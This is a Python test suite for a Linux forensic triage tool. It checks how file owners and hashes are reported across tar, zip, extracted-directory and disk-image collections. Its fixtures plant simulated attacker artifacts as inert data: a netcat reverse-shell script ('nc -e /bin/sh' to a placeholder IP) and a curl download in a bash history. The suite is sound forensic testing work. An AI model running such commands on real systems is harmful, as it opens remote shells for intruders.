#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Test what FILE_INVENTORY says about every file: its owner and its hash.

    python tests/test_inventory.py            # against src/linsight
    python tests/test_inventory.py --built    # against the built linsight.py

The collections are built here, in a temp directory, because the whole point
of this suite is that the same six files answer differently depending on the
container they arrive in - and the interesting answers are the two that are
blank.

An owner is not a cosmetic column. It is read as a statement about the host,
so the ways it can be wrong are worse than the ways it can be missing:

  wrong host   uid 1001 means nothing until it is resolved, and it must be
               resolved against the *collection's* /etc/passwd. Resolved
               against the analysis box it names whoever happens to hold 1001
               there, which is a real account name attached to somebody
               else's file.
  wrong owner  the owner of an extracted directory is whoever ran `tar -x`.
               Reading st_uid back would report the analyst as the owner of
               every file on the host, in a column an examiner will quote.
  wrong source the tar header is the host's when the collector wrote it and
               the inode's own record is better. Where both exist the inode
               has to win, or a re-tarred collection quietly overrides the
               bodyfile it carries.

So half of these assert an empty cell, and one asserts a number that did not
resolve - because a uid no passwd entry claims is a lead, not a failure.

The hash half has one failure mode that costs correctness and one that costs
an hour. A hash the collection recorded is a better record of what the file
was than one computed off a copy afterwards, so it must never be quietly
recomputed over. And a .tar.gz is one gzip stream, so reading its members in
name order rather than in archive order re-decompresses from the start every
time - 55ms a file against 0.2ms, on an archive of 58 MB, and worse as the
archive grows. That one is asserted structurally rather than with a
stopwatch: one call has to leave every member already hashed, which is only
true of a single pass.
"""

import argparse
import hashlib
import io
import os
import sys
import tarfile
import tempfile
import time
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

#: /etc/passwd as the *collection* has it. 1001 is deploy here and is
#: deliberately a uid the analysis box is likely to have too, under another
#: name - that is the confusion this suite exists to catch.
PASSWD = (b"root:x:0:0:root:/root:/bin/bash\n"
          b"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
          b"deploy:x:1001:1001:deploy:/home/deploy:/bin/bash\n")

#: (member, bytes, tar uname, tar uid). '/tmp/.x' carries no uname on purpose:
#: a tar written where no passwd entry claims the uid looks exactly like this.
FILES = [
    ("live_response/process/ps.txt", b"root 1 /sbin/init\n", "root", 0),
    ("[root]/etc/passwd", PASSWD, "root", 0),
    ("[root]/var/www/html/upload.php", b"<?php ?>\n", "www-data", 33),
    ("[root]/home/deploy/.bash_history", b"curl -O http://1.2.3.4/x\n",
     "deploy", 1001),
    ("[root]/tmp/.x", b"#!/bin/sh\nnc -e /bin/sh 1.2.3.4 4444\n", "", 1337),
]

#: The bodyfile disagrees with the tar headers on every file it names, so a
#: test that passes cannot be passing by coincidence: upload.php is www-data
#: in the header and 1001 on the inode, and /tmp/.x is 1337 in the header and
#: 0 on the inode.
BODYFILE = (b"0|/etc/passwd|11|-rw-r--r--|0|0|120|0|1700000000|0|0\n"
            b"0|/var/www/html/upload.php|12|-rw-r--r--|1001|1001|9|0|1700000000|0|0\n"
            b"0|/tmp/.x|13|-rwxr-xr-x|0|0|10|0|1700000000|0|0\n")


def load(built):
    """The package, or the built single file, as one flat namespace."""
    if built:
        import importlib.util
        path = os.path.join(ROOT, "linsight.py")
        if not os.path.exists(path):
            raise SystemExit("[!] %s does not exist - run tools/build.py"
                             % path)
        spec = importlib.util.spec_from_file_location("linsight_built", path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module
    sys.path.insert(0, os.path.join(ROOT, "src"))
    import linsight.collect, linsight.disk, linsight.tables, linsight.triage

    class Flat(object):
        pass

    flat = Flat()
    for mod in (linsight.collect, linsight.disk, linsight.tables,
                linsight.triage):
        for name in dir(mod):
            if not name.startswith("__"):
                setattr(flat, name, getattr(mod, name))
    return flat


# ---------------------------------------------------------------------------
# the same collection, in four containers
# ---------------------------------------------------------------------------

def write_tar(path, bodyfile=False):
    with tarfile.open(path, "w") as tf:
        items = list(FILES)
        if bodyfile:
            items.append(("bodyfile/bodyfile.txt", BODYFILE, "root", 0))
        for name, data, uname, uid in items:
            ti = tarfile.TarInfo(name)
            ti.size, ti.mtime, ti.mode = len(data), int(time.time()) - 86400, 0o644
            ti.uname, ti.uid = uname, uid
            ti.gname, ti.gid = uname, uid
            tf.addfile(ti, io.BytesIO(data))
    return path


def write_zip(path):
    with zipfile.ZipFile(path, "w") as zf:
        for name, data, _u, _i in FILES:
            zf.writestr(name, data)
    return path


def write_dir(path):
    for name, data, _u, _i in FILES:
        full = os.path.join(path, name.replace("/", os.sep))
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "wb") as fh:
            fh.write(data)
    return path


class Opts(object):
    """The handful of flags the table build reads, and nothing else."""
    quiet = True
    debug = False
    scope = "full"
    sigma = None
    keywords = None
    no_hunt = True
    pivot = None
    hash_algos = ()


def build(L, col, hash_algos=()):
    """FILE_INVENTORY over one collection -> the Table."""
    opts = Opts()
    opts.hash_algos = tuple(hash_algos)
    tri = L.Triage(col, opts)
    tri.analyze_accounts()          # what uid_name resolves against
    tb = L.TableBuilder(col, tri)
    tb.build(only=["t_file_inventory"], verbose=False)
    return next(x for x in tb.tables if x.name == "FILE_INVENTORY")


def inventory(L, col):
    """{path: (owner, owner_source)}."""
    t = build(L, col)
    i = t.columns.index("owner")
    return dict((r[0], (r[i], r[i + 1])) for r in t.iter_rows())


def digests(L, col, hash_algos=()):
    """{path: {column: value}} over the hash columns, whichever exist."""
    t = build(L, col, hash_algos)
    want = [c for c in ("md5", "sha1", "sha256", "hash_source")
            if c in t.columns]
    idx = [(c, t.columns.index(c)) for c in want]
    return (want,
            dict((r[0], dict((c, r[i]) for c, i in idx))
                 for r in t.iter_rows()))


# ---------------------------------------------------------------------------
# harness
# ---------------------------------------------------------------------------

class Result(object):
    def __init__(self):
        self.passed = 0
        self.failed = []

    def check(self, what, cond, why="did not hold"):
        if cond:
            self.passed += 1
            print("  [ok] %s" % what)
        else:
            self.failed.append((what, why))
            print("  [!!] %s: %s" % (what, why))

    def skip(self, what, why):
        print("  [--] %s: %s" % (what, why))


# ---------------------------------------------------------------------------
# checks
# ---------------------------------------------------------------------------

def check_tar(L, tmp, res):
    print("\na tar, which is the only container that carries an owner")
    got = inventory(L, L.Collection(write_tar(os.path.join(tmp, "plain.tar"))))

    res.check("the header's uname is the owner",
              got["[root]/etc/passwd"] == ("root", "archive"),
              "got %r" % (got.get("[root]/etc/passwd"),))
    res.check("and it is the header's, not this host's",
              got["[root]/var/www/html/upload.php"] == ("www-data", "archive"),
              "got %r" % (got.get("[root]/var/www/html/upload.php"),))
    res.check("a header with no uname keeps the bare uid, which is the lead",
              got["[root]/tmp/.x"] == ("1337", "archive"),
              "got %r" % (got.get("[root]/tmp/.x"),))
    res.check("the collector's own output is owned too",
              got["live_response/process/ps.txt"] == ("root", "archive"),
              "got %r" % (got.get("live_response/process/ps.txt"),))


def check_bodyfile_wins(L, tmp, res):
    print("\nthe same tar, carrying a bodyfile that disagrees with it")
    got = inventory(L, L.Collection(write_tar(os.path.join(tmp, "body.tar"),
                                              bodyfile=True)))

    res.check("the inode beats the container header",
              got["[root]/var/www/html/upload.php"] == ("deploy", "bodyfile"),
              "header said www-data, inode says 1001; got %r"
              % (got.get("[root]/var/www/html/upload.php"),))
    res.check("including where the header looked like a lead and was not",
              got["[root]/tmp/.x"] == ("root", "bodyfile"),
              "got %r" % (got.get("[root]/tmp/.x"),))
    res.check("a file the bodyfile does not name still falls back",
              got["live_response/process/ps.txt"] == ("root", "archive"),
              "got %r" % (got.get("live_response/process/ps.txt"),))
    res.check("1001 resolved against the collection's passwd, not this box's",
              got["[root]/var/www/html/upload.php"][0] == "deploy",
              "got %r" % (got.get("[root]/var/www/html/upload.php"),))


def check_blank(L, tmp, res):
    print("\nthe two containers that cannot answer, and do not guess")
    z = inventory(L, L.Collection(write_zip(os.path.join(tmp, "coll.zip"))))
    res.check("a zip has no POSIX owner, so every cell is empty",
              all(v == ("", "") for v in z.values()),
              "got %r" % ([k for k, v in z.items() if v != ("", "")],))

    d = os.path.join(tmp, "extracted")
    os.makedirs(d, exist_ok=True)
    got = inventory(L, L.Collection(write_dir(d)))
    res.check("an extracted directory reports nobody rather than the analyst",
              all(v == ("", "") for v in got.values()),
              "got %r" % ([k for k, v in got.items() if v != ("", "")],))


def check_disk(L, res):
    print("\na disk image, where the uid is read off the inode")
    img = os.path.join(ROOT, "tests", "fixtures", "ext4.img")
    if not os.path.exists(img):
        res.skip("a disk image reads the owner from the inode",
                 "no ext4.img fixture")
        return
    got = inventory(L, L.DiskCollection(img))
    named = [(p, v) for p, v in got.items() if v[0]]
    res.check("every file on the image has an owner",
              len(named) > 100, "only %d of %d rows carry one"
              % (len(named), len(got)))
    res.check("and it is sourced as the filesystem, not a bodyfile",
              all(v[1] == "filesystem" for _p, v in named),
              "got %r" % (sorted(set(v[1] for _p, v in named)),))
    res.check("resolved to names rather than left numeric",
              any(not v[0].isdigit() for _p, v in named),
              "every owner is still a number")


def check_hash_columns(L, tmp, res):
    print("\nhash columns exist only where there is something to put in them")
    want, _got = digests(L, L.Collection(write_tar(os.path.join(tmp, "nh.tar"))))
    res.check("a collection that hashed nothing gets no hash columns",
              want == [], "got %r" % (want,))

    want, got = digests(L, L.Collection(write_tar(os.path.join(tmp, "sha.tar"))),
                        ("sha256",))
    res.check("--hash adds the one it was asked for, and a source",
              want == ["sha256", "hash_source"], "got %r" % (want,))
    res.check("every file is hashed, and says it was computed here",
              all(r["sha256"] and r["hash_source"] == "computed"
                  for r in got.values()),
              "got %r" % (sorted(set(r["hash_source"] for r in got.values())),))

    want, got = digests(L, L.Collection(write_tar(os.path.join(tmp, "two.tar"))),
                        ("sha256", "md5"))
    res.check("several run in one pass, in a fixed column order",
              want == ["md5", "sha256", "hash_source"], "got %r" % (want,))

    wrong = [name for name, data, _u, _i in FILES
             if (got.get(name, {}).get("sha256")
                 != hashlib.sha256(data).hexdigest()
                 or got.get(name, {}).get("md5")
                 != hashlib.md5(data).hexdigest())]
    res.check("and they are the digests of the bytes in the archive",
              not wrong, "wrong for %r" % (wrong,))


def check_recorded_wins(L, tmp, res):
    print("\na hash the collection recorded is never recomputed over")
    # deliberately not the file's own digest, so 'what the collector recorded'
    # and 'what we would compute' cannot be mistaken for one another
    planted = "0" * 64
    path = os.path.join(tmp, "recorded.tar")
    with tarfile.open(path, "w") as tf:
        items = list(FILES) + [
            ("hash_executables/passwd.sha256",
             ("%s  /etc/passwd" % planted).encode() + b"\n", "root", 0)]
        for name, data, uname, uid in items:
            ti = tarfile.TarInfo(name)
            ti.size, ti.mtime, ti.mode = len(data), 1700000000, 0o644
            ti.uname, ti.uid = uname, uid
            tf.addfile(ti, io.BytesIO(data))

    want, got = digests(L, L.Collection(path))
    res.check("a recorded hash brings its column with it, with no --hash",
              want == ["sha256", "hash_source"], "got %r" % (want,))
    res.check("and is shown as collected rather than computed",
              got["[root]/etc/passwd"]["hash_source"] == "collected",
              "got %r" % (got.get("[root]/etc/passwd"),))
    res.check("the collector's digest stands, not one taken off the copy",
              got["[root]/etc/passwd"]["sha256"] == planted,
              "got %r" % (got["[root]/etc/passwd"]["sha256"],))

    want, got = digests(L, L.Collection(path), ("sha256",))
    res.check("--hash fills in the rest and leaves that one alone",
              got["[root]/etc/passwd"]["sha256"] == planted
              and len(got["[root]/tmp/.x"]["sha256"]) == 64,
              "got %r" % (got["[root]/etc/passwd"]["sha256"],))
    res.check("each row says which of the two it carries",
              got["[root]/etc/passwd"]["hash_source"] == "collected"
              and got["[root]/tmp/.x"]["hash_source"] == "computed",
              "got %r / %r" % (got["[root]/etc/passwd"]["hash_source"],
                               got["[root]/tmp/.x"]["hash_source"]))


def check_gzip_one_pass(L, tmp, res):
    print("\na .tar.gz is hashed in one pass rather than seeked through")
    path = os.path.join(tmp, "ordered.tar.gz")
    # archive order is the reverse of name order on purpose: name order is
    # what the inventory walks in, and reading a gzip stream that way is the
    # 250x case this exists to avoid
    bodies = {}
    with tarfile.open(path, "w:gz") as tf:
        entries = [("[root]/etc/%03d.conf" % i, b"payload %d\n" % i)
                   for i in range(60, 0, -1)]
        entries.append(("live_response/process/ps.txt", b"root 1 /sbin/init\n"))
        for name, data in entries:
            bodies[name] = data
            ti = tarfile.TarInfo(name)
            ti.size, ti.mtime, ti.mode = len(data), 1700000000, 0o644
            ti.uname, ti.uid = "root", 0
            tf.addfile(ti, io.BytesIO(data))

    col = L.Collection(path)
    col.member_hash(sorted(col._names.values())[0], ("sha256",))
    res.check("asking for one member leaves every member hashed",
              col._digests is not None and len(col._digests) == len(bodies),
              "cached %r of %d" % (None if col._digests is None
                                   else len(col._digests), len(bodies)))

    _want, got = digests(L, L.Collection(path), ("sha256",))
    wrong = [n for n, data in bodies.items()
             if got.get(n, {}).get("sha256") != hashlib.sha256(data).hexdigest()]
    res.check("and every digest still belongs to the member it is beside",
              not wrong, "wrong for %r" % (wrong[:4],))


def check_only_files(L, res):
    print("\nonly the things that have contents are hashed")
    img = os.path.join(ROOT, "tests", "fixtures", "ext4.img")
    if not os.path.exists(img):
        res.skip("a directory is not given the digest of nothing",
                 "no ext4.img fixture")
        return
    empty = hashlib.sha256(b"").hexdigest()
    t = build(L, L.DiskCollection(img), ("sha256",))
    ip, ih, iz = (t.columns.index("path"), t.columns.index("sha256"),
                  t.columns.index("size_bytes"))
    claimed = [r[ip] for r in t.iter_rows()
               if r[ih] == empty and str(r[iz]) not in ("0", "")]
    res.check("nothing with contents claims the digest of an empty file",
              not claimed, "got %r" % (claimed[:4],))
    res.check("and the files that do have contents are hashed",
              sum(1 for r in t.iter_rows() if r[ih]) > 100,
              "only %d" % sum(1 for r in t.iter_rows() if r[ih]))


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--built", action="store_true",
                    help="test the built linsight.py instead of src/linsight")
    opts = ap.parse_args()
    L = load(opts.built)

    res = Result()
    tmp = tempfile.mkdtemp(prefix="linsight-inv-")
    print("collections: %s" % tmp)

    check_tar(L, tmp, res)
    check_bodyfile_wins(L, tmp, res)
    check_blank(L, tmp, res)
    check_disk(L, res)
    check_hash_columns(L, tmp, res)
    check_recorded_wins(L, tmp, res)
    check_gzip_one_pass(L, tmp, res)
    check_only_files(L, res)

    print("\n%d passed, %d failed" % (res.passed, len(res.failed)))
    if res.failed:
        print("\nfailures:")
        for what, why in res.failed:
            print("  %s: %s" % (what, why))
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
